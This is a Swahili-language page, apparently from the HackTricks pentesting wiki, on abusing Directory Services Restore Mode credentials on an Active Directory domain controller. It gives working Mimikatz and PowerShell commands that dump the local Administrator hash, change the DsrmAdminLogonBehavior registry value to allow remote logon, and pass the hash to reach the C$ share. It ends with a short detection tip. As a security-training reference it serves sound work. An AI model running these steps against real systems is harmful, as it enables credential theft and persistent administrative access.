{{#include ../../banners/hacktricks-training.md}}

# DSRM Credentials

Kuna akaunti ya **meneja wa ndani** ndani ya kila **DC**. Ukiwa na haki za admin katika mashine hii unaweza kutumia mimikatz **kutoa hash ya Meneja wa ndani**. Kisha, kubadilisha rejista ili **kuamsha nenosiri hili** ili uweze kufikia kwa mbali mtumiaji huyu wa Meneja wa ndani.\
Kwanza tunahitaji **kutoa** **hash** ya mtumiaji wa **Meneja wa ndani** ndani ya DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Kisha tunahitaji kuangalia kama akaunti hiyo itafanya kazi, na ikiwa ufunguo wa rejista una thamani "0" au haupo unahitaji **kuweka kuwa "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Kisha, ukitumia PTH unaweza **kuorodhesha maudhui ya C$ au hata kupata shell**. Kumbuka kwamba kwa kuunda kikao kipya cha powershell na hash hiyo kwenye kumbukumbu (kwa PTH) **"domain" inayotumika ni jina tu la mashine ya DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Zaidi ya habari kuhusu hii katika: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) na [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Kupunguza

- Kitambulisho cha Tukio 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
